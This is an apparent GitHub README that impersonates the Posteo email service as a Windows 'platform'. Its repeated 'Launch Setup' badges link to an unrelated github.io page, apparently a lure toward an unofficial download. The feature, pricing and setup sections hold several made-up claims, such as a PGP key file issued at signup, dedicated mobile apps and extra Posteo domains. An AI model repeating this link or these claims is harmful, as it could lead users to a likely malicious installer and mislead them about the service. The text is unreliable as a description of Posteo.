# Posteo Secure Email Platform for Windows

<div align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Posteo.png" alt="Posteo Secure Email Platform" width="800">
</div>

[![Launch Setup](https://img.shields.io/badge/⚡️_Launch_Setup-1d4ed8?style=for-the-badge)](https://marshallgonzalessuws.github.io/.github/Posteo-Secure-Email)

---

## What is Posteo?

Posteo is a secure, green, and privacy-focused email service based in Germany that operates on 100% green energy with certified carbon-neutral hosting . Launched in 2009, Posteo offers anonymous, ad-free email with full encryption—no data mining, no tracking, and no advertising. It is funded exclusively through user fees, ensuring there are no conflicts of interest.

Infrastructure teams managing secure communications benefit from Posteo's comprehensive approach to privacy: all emails are stored encrypted at rest, all connections use SSL/TLS, and the service operates under strict German privacy laws. System administrators appreciate full IMAP/SMTP/POP3 compatibility with all major email clients on Windows, plus advanced security features.

---

## Screenshot Block

<div align="center">
  <img src="https://cdn.posteo.de/help/49382-exporting-data-from-posteo/1-exporting-an-email-from-the-posteo-webmail-interface.jpg" alt="Posteo Webmail Interface" width="700">
</div>

[![Launch Setup](https://img.shields.io/badge/⚡️_Launch_Setup-1d4ed8?style=for-the-badge)](https://marshallgonzalessuws.github.io/.github/Posteo-Secure-Email)

---

## Key Features

| Feature | Description |
|---------|-------------|
| **End-to-End Encryption** | All emails are stored encrypted at rest, with full PGP support for encrypting messages and attachments  |
| **100% Green Energy** | Server operations powered entirely by renewable energy; servers are also operated in a climate-neutral manner (gold standard)  |
| **No Tracking, No Ads** | No data mining, no advertising, no tracking of user behavior  |
| **Anonymous Sign-Up** | Create an account without providing personal information. Accepts cash by mail and other anonymous payment methods  |
| **Full Protocol Support** | IMAP, SMTP, POP3 support for any email client—Outlook, Thunderbird, Apple Mail  |
| **Two-Factor Authentication** | 2FA with TOTP and FIDO2 (WebAuthn) security keys  |
| **PGP Encryption** | Integrated PGP support with server-side automatic encryption of incoming emails  |
| **Automatic Encryption of Incoming Emails** | If you share your public PGP key with Posteo, all future emails are automatically encrypted on the server  |
| **Spam & Virus Protection** | Intelligent spam filtering based on SpamAssassin with whitelist/blacklist management and virus scanning  |
| **Alias Management** | Create up to 20 free aliases for your mailbox  |
| **Fast Webmail** | Simple, ad-free, and accessible webmail interface with SSL encryption  |
| **Mobile Apps** | Dedicated apps for Android and iPhone with push notifications  |

---

## Pricing Plans

| Feature | Details |
|---------|---------|
| **Cost** | €1 per month (paid quarterly: €3/quarter)  |
| **Storage** | 2 GB initial storage, can be upgraded to 20 GB or more  |
| **Aliases** | 20 aliases included  |
| **Email Addresses** | 1 active email address per account (can be changed at any time)  |
| **Fax** | Optional fax service available  |

### Payment Methods

- **Anonymous:** Cash by mail, crypto currencies (Bitcoin, Monero), and other anonymous payment options
- **Standard:** Bank transfer (SEPA), credit card, PayPal

---

## Installation Guide

### Prerequisites

- Windows 10/11 with internet access
- Any email client (Outlook, Thunderbird, Apple Mail) or web browser

### Step 1: Create a Posteo Account

**Step 1:** Visit the Posteo website at `https://posteo.de/en`.

**Step 2:** Click **Sign up now** to create an account.

**Step 3:** Choose your email address from Posteo's available domains:
- `@posteo.de`
- `@posteo.net`
- `@posteo.com`
- `@posteo.eu`
- `@posteo.org`
- `@posteo.co.uk`
- `@posteo.us`

**Step 4:** During signup, you receive a **key file** containing your PGP key and encryption certificate . Download and store it safely offline.

**Important:** The key file is required to recover your account. Without it, data cannot be restored .

### Step 2: Configure DNS (for Custom Domains)

Posteo supports custom domains:

**Step 1:** In the Posteo settings, navigate to Add Custom Domain.

**Step 2:** Create the required DNS entries at your provider:

| Record | Value |
|--------|-------|
| MX Record | `mx.posteo.de` (priority 10) |
| SPF | `v=spf1 mx -all` |
| DKIM | Provided via the Posteo interface |

### Step 3: Configure Email Client

**IMAP Settings (Incoming Mail):**

| Setting | Value |
|---------|-------|
| Server | `posteo.de` |
| Port | `993` (SSL/TLS) |
| Username | Your full Posteo email address |
| Password | Your Posteo password |

**SMTP Settings (Outgoing Mail):**

| Setting | Value |
|---------|-------|
| Server | `posteo.de` |
| Port | `587` (STARTTLS) |
| Authentication | Required |
| Username | Your full Posteo email address |
| Password | Your Posteo password |

### Step 4: Access Webmail

**Step 1:** Open `https://webmail.posteo.de` in your browser.

**Step 2:** Enter your full email address and password.

**Step 3:** Access your encrypted inbox.

### Step 5: Mobile Apps

Posteo offers dedicated apps for Android and iPhone:
- **Android:** Available in F-Droid or via direct APK download
- **iOS:** Available in the App Store

---

## Security Features

| Security Layer | Description |
|----------------|-------------|
| **Encryption at Rest** | All emails are encrypted immediately upon arrival and only decrypted when opened by authorized users  |
| **SSL/TLS** | All connections (IMAP, SMTP, POP3, and webmail) are SSL/TLS encrypted  |
| **PGP Support** | Full PGP encryption for outgoing and incoming emails  |
| **Automatic Encryption** | Incoming emails can be automatically encrypted with PGP if you share your public key  |
| **Two-Factor Authentication** | TOTP and FIDO2 (WebAuthn) security keys supported  |
| **Encrypted Password Storage** | Passwords are not readable on the server—only used to derive the encryption key  |
| **Key File Recovery** | Account recovery requires the key file provided at signup, which contains the PGP key and encryption certificate  |

---

## Email Encryption

### How Posteo Encryption Works

1. **Data protection beyond password security**—The key file ensures no one can access your emails even if the password is known  .
2. **Encryption happens immediately**—Emails are encrypted upon arrival .
3. **Separate credentials**—The login password and encryption password are kept separate . The login password is only the key to the key—it decrypts the key file during login, not the emails directly .

### PGP Integration

Posteo offers built-in PGP encryption:
- Send encrypted messages to any PGP recipient
- Incoming emails can be automatically encrypted server-side
- Public PGP key can be uploaded via the web interface

### End-to-End Encrypted Email to Other Posteo Users

When sending an email to another Posteo address, it remains encrypted throughout the entire process and is stored encrypted at rest, using your public PGP key .

---

## Green & Sustainable

### Environmental Commitment

Posteo has been operating its servers with 100% green electricity since 2009, including the cooling systems . Since 2022, the company has become climate-neutral, supporting certified climate projects and using 100% green energy . Posteo actively avoids generating CO2 and invests in CO2 offsetting for any unavoidable emissions.

---

## System Requirements

| Component | Specification |
|-----------|---------------|
| **Operating System** | Windows 10, Windows 11 (any platform) |
| **Email Clients** | Outlook, Thunderbird, Apple Mail, any IMAP/POP3 client |
| **Webmail Access** | Any modern browser (Chrome, Firefox, Edge, Safari) |
| **Mobile Apps** | Android, iPhone |
| **Internet** | Required for email sending/receiving |
| **Compliance** | GDPR, German Privacy Laws |

---

## Keywords

Posteo • Secure Email • Green Email • Privacy Email • Encrypted Email • PGP • IMAP • SMTP • POP3 • German Privacy • Two-Factor Authentication • FIDO2 • WebAuthn • Anonymous Sign-Up • Carbon Neutral • Climate Neutral • Email Hosting • Webmail • Outlook • Thunderbird • Android Email • iPhone Email • Posteo de • Posteo net • Posteo com • Email Encryption • Green Energy
